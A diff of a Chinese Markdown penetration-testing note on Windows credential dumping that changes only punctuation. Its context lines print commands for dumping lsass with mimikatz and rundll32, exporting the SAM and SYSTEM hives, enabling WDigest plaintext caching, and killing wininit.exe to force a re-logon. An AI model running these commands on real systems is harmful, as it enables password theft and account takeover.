@@ -71,7 +71,7 @@ laZagne_x86.exe windows
 ### lsass 内存 dump
 
 工具仅部分，通过以下操作可先获取到 lsass 内存文件，然后使用 mimikatz 可进一步读取密码。  
-参考命令:
+参考命令：
 
 ```css
 mimikatz.exe"sekurlsa::minidump lsass.dmp""sekurlsa::logonPasswords full" "exit"
@@ -119,7 +119,7 @@ for /f  "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" /NH') do rundll
 
 ### 关于 SAM 数据库
 
-管理员执行:
+管理员执行：
 
 ```css
 reg save hklm\sam .\sam.hive&reg save hklm\system .\system.hive
@@ -159,7 +159,7 @@ reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCr
 taskkill /f /im "wininit.exe"
 ```
 
-可参考: https://www.mrwu.red/web/2000.html
+可参考：https://www.mrwu.red/web/2000.html
 
 ### 总结
 
